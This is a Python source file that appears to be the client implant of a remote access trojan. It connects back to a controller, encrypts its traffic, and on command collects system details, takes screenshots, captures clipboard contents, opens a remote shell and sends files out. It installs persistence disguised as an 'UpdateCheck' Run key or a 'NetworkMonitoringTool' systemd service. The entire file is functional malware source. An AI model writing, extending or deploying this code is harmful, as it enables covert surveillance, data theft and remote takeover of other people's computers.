# Cyrptographic Libraries
from Crypto.Util.number import getRandomNBitInteger
from Crypto.Protocol.KDF import HKDF
from Crypto.Hash import SHA256
from Crypto.Cipher import ChaCha20
from Crypto.Random import get_random_bytes
# Main Libraries
import socket as s
from time import sleep
import platform
import subprocess
import pickle
try:
    import winreg as reg
    win_flag = True
except ModuleNotFoundError:
    win_flag = False
from sys import executable
from PIL import ImageGrab
import io
import re
import threading
import pyperclip
import os

def start_diffie_hellman_exchange(conn_obj, bits=2048):
    received_data = conn_obj.recv(4096).decode().strip()
    if '\n' not in received_data:
        raise ValueError
    
    p, g, server_public = map(int, received_data.split('\n'))

    # Generate client's private and public keys
    private_key = getRandomNBitInteger(bits)
    public_key = pow(g, private_key, p)

    # Send client's public key to server
    conn_obj.sendall(str(public_key).encode())

    # Compute the shared secret
    shared_secret = pow(server_public, private_key, p)

    # Derive a symmetric key from the shared secret
    symmetric_key = HKDF(shared_secret.to_bytes((shared_secret.bit_length() + 7) // 8, 'big'), 32, b'', SHA256)
    
    return symmetric_key

def encrypt_message(plaintext):
    global symmetric_key
    if isinstance(plaintext, str):
        plaintext = plaintext.encode()
    elif not isinstance(plaintext, bytes):
        plaintext = pickle.dumps(plaintext)

    # Generate a unique 12-byte nonce for each encryption
    nonce = get_random_bytes(12)
    cipher = ChaCha20.new(key=symmetric_key, nonce=nonce)
    encrypted_message = cipher.encrypt(plaintext)

    return nonce + encrypted_message

def decrypt_message(encrypted_message):
    global symmetric_key
    
    if len(encrypted_message) < 12:
        return None
    
    nonce = encrypted_message[:12]
    ciphertext = encrypted_message[12:]
    
    try:
        cipher = ChaCha20.new(key=symmetric_key, nonce=nonce)
        decrypted_data = cipher.decrypt(ciphertext)
        try:
            return pickle.loads(decrypted_data)
        except pickle.UnpicklingError:
            try:
                return decrypted_data.decode()
            except UnicodeDecodeError:
                return None
    except Exception as e:
        return None

def connect_server(server_ip, port):
    while True:
        try:
            conn_obj = s.socket(s.AF_INET, s.SOCK_STREAM)
            conn_obj.connect((server_ip, port))
            break
        except s.error:
            sleep(10)
    return conn_obj

def windows_sys_info():
    try:
        system_info_output = process_command("systeminfo")
        if "Error" in system_info_output:
            raise ValueError()
    except:
        return "no_information"
    
    output = []
    patterns = {
        'Hostname': r"Host Name:\s+([^\r\n]+)",
        'OS Name': r"OS Name:\s+([^\r\n]+)",
        'OS Version': r"OS Version:\s+([^\r\n]+)",
        'OS Manufacturer': r"OS Manufacturer:\s+([^\r\n]+)",
        'Registered Owner': r"Registered Owner:\s+([^\r\n]+)",
        'Registered Organization': r"Registered Organization:\s+([^\r\n]+)",
        'System Manufacturer': r"System Manufacturer:\s+([^\r\n]+)",
        'System Directory': r"System Directory:\s+([^\r\n]+)",
        'Domain': r"Domain:\s+([^\r\n]+)",
        'Logon Server': r"Logon Server:\s+\\\\([^\r\n]+)",
        'IP Address': r"IP address\(es\)\s+[^:]+:\s+([0-9]{1,3}(?:\.[0-9]{1,3}){3})"
    }

    for key, value in patterns.items():
        system_output = re.search(value, system_info_output, re.MULTILINE)
        if system_output:
            output.append(f"{key}: {system_output.group(1)}")
        else:
            output.append(f"No information found for {key}")
    
    if not isinstance(output,list):
        return "no_information"
    else:
        return output 

def linux_sys_info():
    output = []
    system_info = {
        "Hostname": process_command("hostname"),
        "OS Name": process_command("cat /etc/os-release | grep PRETTY_NAME | cut -d '=' -f2- | tr -d '\"'"),
        "OS Version": process_command("lsb_release -r | cut -f2"),
        "System Manufacturer": process_command("cat /sys/devices/virtual/dmi/id/sys_vendor"),
        "Kernel Version": process_command("uname -r"),
        "Domain": process_command("domainname"),
        "Logon Server": process_command("echo $SSH_CONNECTION | awk '{print $3}'"),
        "IP Address": process_command("hostname -I"),
        "Shell Used": process_command("printenv")
    }

    for key, value in system_info.items():
        if "Permission denied" in value:
            value = "Requires Sudo Privileges"
        elif "Error" in value or not value:
            value = "Unable to Extract Detail"
        
        if key == "Shell Used":
            shell_value = re.search(r"(?<=SHELL=)[^\s]+", value)
            if shell_value:
                value = shell_value.group(0)
                    
        output.append(f"{key}: {value}")
    
    if isinstance(output, list):
        return output
    else:
        return "no_information"
    
def system_information():
    OS_platform = platform.platform().lower()
    system_output = []
    
    if "windows" not in OS_platform:
        system_output = linux_sys_info()
    else:
        system_output = windows_sys_info()
        
    return system_output

def take_screenshot(conn_obj):
    screenshot = ImageGrab.grab()
    screenshot_buffer = io.BytesIO()
    screenshot.save(screenshot_buffer, format='PNG')
    screenshot_data = screenshot_buffer.getvalue()

    data_size = len(screenshot_data)
    conn_obj.sendall(str(data_size).encode() + b'\n')

    return screenshot_data 

# Needs testing
def persist_windows(script_path):
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try: # Checking if registry key exists
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_READ)
        reg.QueryValueEx(key, "UpdateCheck")
        reg.CloseKey(key) 
        
        return "already_created"
    except FileNotFoundError: # Registry key does not exist
        try:
            key = reg.CreateKeyEx(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE)
            reg.SetValueEx(key, "UpdateCheck", 0, reg.REG_SZ, script_path)
            reg.CloseKey(key)
            
            return "created"
        except:
            return "fail"
    except:
        return "fail"

# Fix not always working
def persist_linux(script_path, script_type):
    service_name = "NetworkMonitoringTool.service"
    service_content = f"""[Unit]
Description=Network Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart={script_type}{script_path}
Restart=always
RestartSec=20

[Install]
WantedBy=default.target
"""
    try:
        user_systemd_path = os.path.expanduser("~/.config/systemd/user")
        service_file_path = os.path.join(user_systemd_path, service_name)
        
        if os.path.exists(service_file_path):
            return "already_created"
        else:
            os.makedirs(user_systemd_path, exist_ok=True)
    except:
        return "fail"
    
    try:
        with open(service_file_path, 'w') as service_file:
            service_file.write(service_content)
    except PermissionError:
        return "fail"
    
    process_command(f"chmod +x {script_path}") 
    process_command("systemctl --user daemon-reload")
    process_command(f"systemctl --user enable {service_name} && systemctl --user start {service_name}")
    
    if os.path.exists(service_file_path):
        return "created"
    else:
        return "fail"

def create_persistence(win_flag):
    output = ''
    platform_info = system_information()
    script_path, script_type = os.path.basename(__file__), ""

    if ".py" in script_path:
        if "Windows" not in platform_info[1] and win_flag is False:
            script_path = os.path.join(process_command("pwd"), os.path.basename(__file__))
        else:
            script_path = os.path.join(process_command("cd"), os.path.basename(__file__))
        script_type = "python "
    else:
        script_path = executable
        script_type = "./"
        
    
    if "Windows" not in platform_info[1] and win_flag is False:
        output = persist_linux(script_path, script_type)
    else:
        output = persist_windows(script_path)
    
    return output
    
def attempt_exchange(conn_obj):
    attempts = 0
    while attempts < 3:
        try:
            symmetric_key = start_diffie_hellman_exchange(conn_obj, 2048)
            return symmetric_key
        except ValueError:
            attempts += 1
            sleep(2)
        except (s.timeout, TimeoutError):
            attempts += 1
            sleep(2)
        if attempts == 3:
            conn_obj.close()
            conn_obj = connect_server(srv_ip, srv_port)
            attempts = 0
    return None

def reconnect_server(srv_ip, srv_port, conn_obj):
    conn_obj = connect_server(srv_ip, srv_port)
    symmetric_key = attempt_exchange(conn_obj)
    if symmetric_key is None:
        exit()
    return conn_obj, symmetric_key

def clipboard_main(conn_obj):
    stop_flag = threading.Event()
    result = [None]  # Use a list to hold the result to allow modification from the thread
    lock = threading.Lock()  # Lock for thread-safe access to the result variable
    
    # Clear clipboard to ensure new data is captured
    pyperclip.copy('')

    def clipboard_steal(clipboard_data):
        while not stop_flag.is_set():
            try:
                info = pyperclip.waitForNewPaste(1)
                if isinstance(info, str) and info.strip():
                    updated_clipboard = (info.strip()[:120]).replace('\n', ' ')  # Trim spaces, limit to 120 chars, replace newlines
                    if len(info) > 120:
                        updated_clipboard = updated_clipboard.strip() + " (Cropped)"  # Tell user data was cut due to length and strip again
                    with lock:
                        clipboard_data.add(updated_clipboard)
            except pyperclip.PyperclipTimeoutException:
                continue  # Timeout occurred

    def clipboard_steal_end(conn_obj, clipboard_data):
        while not stop_flag.is_set():
            try:
                server_message = decrypt_message(conn_obj.recv(4096)).strip()
                if server_message == "END":
                    stop_flag.set()
                    
                    with lock:
                        if len(clipboard_data) == 0:
                            result[0] = "No data captured"
                        else:
                            clipboard_data_list = list(clipboard_data)  # List allows us to encode                    
                            concatenated_data = "\n".join(clipboard_data_list)  # Join list items into a single string with newline as delimiter
                            result[0] = concatenated_data  # Store plain text result
            except s.error:
                continue  # Timeout occurred
            except Exception as e:
                with lock:
                    result[0] = f"Fail: {e}"
                return

    clipboard_data = set()  # Use set to remove duplicates
    thread_clipboard_steal = threading.Thread(target=clipboard_steal, args=(clipboard_data,))
    thread_steal_end = threading.Thread(target=clipboard_steal_end, args=(conn_obj, clipboard_data))

    # Start the threads
    thread_clipboard_steal.start()
    thread_steal_end.start()

    # Send encrypted "STARTED" message to server
    conn_obj.sendall(encrypt_message("STARTED"))

    # Join the threads
    thread_clipboard_steal.join()
    thread_steal_end.join()

    # Retrieve the result from the shared variable
    final_result = result[0]
    
    return final_result

def shell_prompt():
    username_shell = ''
    if platform.system() == "Windows":
        username_shell = process_command("cd")+" > "
    else:
        username_shell = process_command("pwd")+" > "
    
    if not username_shell or "Error" in username_shell:
        username_shell = "No Username"
    
    return username_shell
  
def shell_command(conn_obj):
    def directory_traverse(command):
        current_directory = os.getcwd()
        try:
            os.chdir(command[3:])
        except FileNotFoundError:
            return "[-] Unknown file or directory on system"
        except Exception as err:
            return f"[-] Unknown error when changing directory : {err}"

        new_directory = os.getcwd()

        if new_directory == current_directory:
            return "[-] The current directory did not change, please ensure the 'cd' command is correct"
        else:
            return f"[+] Current directory changed -> {new_directory}"
                
    # Establish username
    conn_obj.sendall(encrypt_message(shell_prompt()))
    command = ''
    
    # Continue with rest of command
    while True:
        clear_socket_buffer(conn_obj) # Clear buffer
        
        command = decrypt_message(conn_obj.recv(4096))
        command_output = ''
        
        if not command:
            command_output = "Unable to parse command"
        elif command == "quit" or command == "exit":
            break
        elif command[:3] == 'cd ':
            result = directory_traverse(command)+"::"+shell_prompt()
            conn_obj.sendall(encrypt_message(result))
            continue
        elif command.startswith("download "):
            file_path = command[9:].strip()
            if not os.path.isfile(file_path) or not os.path.exists(file_path):
                conn_obj.sendall(encrypt_message("[-] Unable to find file specified"))
                continue
            else:
                conn_obj.sendall(encrypt_message(str(os.path.getsize(file_path))))
            
            with open(file_path, "rb") as file:
                file_data = file.read()
                conn_obj.sendall(encrypt_message(file_data))
        else:
            command_output = process_command(command)

        if command_output:
            try:
                conn_obj.sendall(encrypt_message(command_output))
            except Exception as e:
                conn_obj.sendall(encrypt_message(f"Error - {e}"))
        else:
            conn_obj.sendall(encrypt_message(f"[!] Command was executed but no output was retrieved"))
        
def process_command(command):
    result = ''
    try:
        output = subprocess.Popen(command, shell= True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        result = output.stdout.read() + output.stderr.read()
        result = result.decode().strip()
    except subprocess.CalledProcessError as e:
        result = f"Internal Execution Error : {e}"
    except Exception as err:
        result = f"Unknown Error : {err}"

    formatted_result = result.replace("\n", "[NEWLINE]")
    return formatted_result.strip()

def clear_socket_buffer(conn_obj):
    original_timeout = conn_obj.gettimeout()
    conn_obj.settimeout(0.1) 
    
    try:
        while True:
            if conn_obj.recv(4096) == b'':
                break
    except s.timeout:
        pass
    finally:
        conn_obj.settimeout(original_timeout)
  
def upload(conn_obj):
    pass

def reliable_recieve(conn_obj, data_size):
    conn_obj.settimeout(max(10, data_size / (1024 * 1024)))  # Set dynamic timeout based on size
    
    received_data = b''
    while len(received_data) < data_size:
        packet = conn_obj.recv(min(4096, data_size - len(received_data)))  # Receive in chunks
        if not packet:
            break  # Connection closed or data ended unexpectedly
        received_data += packet
    
    return received_data

def process_and_check_recieved_data(received_data, data_size):
    # Check data integrity
    if len(received_data) != data_size:
        return "Failed : Received data size does not match the expected size."
    
    # If all data is received properly, process it
    decrypted_data = decrypt_message(received_data)
    if decrypted_data is None:
        return "Failed : Data is corrupted or else is in an invalid format"
    
    return decrypted_data

def del_persistence(win_flag):
    platform_info = system_information()

    if "Windows" not in platform_info[1] and win_flag is False:
        service_name = "NetworkMonitoringTool.service"
        
        try:
            user_systemd_path = os.path.expanduser("~/.config/systemd/user")
            service_file_path = os.path.join(user_systemd_path, service_name)
            
            target_wants_file_path = os.path.join(user_systemd_path, "default.target.wants")
            target_wants_file_service_path = os.path.join(target_wants_file_path, service_name)
        except:
            return "no_exist"
        
        if not os.path.exists(service_file_path) and not os.path.exists(target_wants_file_service_path):
            return "no_exist"
        elif os.path.exists(target_wants_file_service_path):
            try:
                if "permission" in process_command(f"rm {target_wants_file_service_path}"):
                    return "permission_denied"
            except:
                return "fail"
        
        try:
            process_command(f"systemctl stop {service_name}")
            process_command(f"systemctl disable {service_name}")
            try:
                os.remove(service_file_path)
            except PermissionError:
                return "permission_denied"
            except:
                return "fail"
            process_command("systemctl daemon-reload")
        except:
            return "fail"
        
        if "could not be found" in process_command(f"systemctl status {service_name}"):
            return "success"
        else:
            return "fail"
    else:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE)
            reg.DeleteValue(key, "UpdateCheck")
            reg.CloseKey(key)
            return "success"
        except FileNotFoundError:
            return "no_exist"
        except PermissionError:
            return "permission_denied"
        except:
            return "fail"

# Required Variables
srv_ip, srv_port = '127.0.0.1', 5555 # SETUP SCRIPT WILL UPDATE THIS VALUE (DO NOT DELETE THIS COMMENT)
stop_flag = threading.Event() 

conn_obj = connect_server(srv_ip, srv_port)
conn_obj.settimeout(10**6) 

print("[+] Connected to server") # debugging (to delete)

# Encyrption setup
symmetric_key = attempt_exchange(conn_obj)
if symmetric_key is None: exit()
        
while True:
    try:
        server_message = conn_obj.recv(4096).strip()
        server_message = decrypt_message(server_message)
        
        if server_message not in ["sys_info", "persist", "del_persist", "screenshot", "clipboard_steal", "shell", "kill", "mic_record", "migrate"]:
            conn_obj.sendall(encrypt_message("retry"))
            server_message = decrypt_message(conn_obj.recv(4096))
        elif server_message == "kill":
            break

    except (ConnectionAbortedError, ConnectionResetError, ConnectionError, EOFError):
        conn_obj, symmetric_key = reconnect_server(srv_ip, srv_port, conn_obj)
        conn_obj.settimeout(60)
    except s.timeout:
        break   
    
    output = "No information gathered" 
    try:
        if server_message == "sys_info":
            output = system_information()
        elif server_message == "persist":
            output = create_persistence(win_flag)
        elif server_message == "del_persist":
            output = del_persistence(win_flag)
        elif server_message == "screenshot":
            output = take_screenshot(conn_obj)
        elif server_message == "clipboard_steal":
            output = clipboard_main(conn_obj)
        elif server_message == "shell":
            shell_command(conn_obj)
    except (ConnectionAbortedError, ConnectionResetError, ConnectionError, EOFError):
        conn_obj, symmetric_key = reconnect_server(srv_ip, srv_port, conn_obj)
        conn_obj.settimeout(60)
    finally:
        if not output:
            output == "No information gathered"
        if server_message != "shell":
            output = encrypt_message(output)
            conn_obj.sendall(output)
        clear_socket_buffer(conn_obj)

try:   
    conn_obj.sendall(encrypt_message("shutdown_confirmed"))     
    conn_obj.close()
except:
    try:
        conn_obj.sendall(encrypt_message("connection_not_closed")) 
    except:
        pass
finally:
    exit()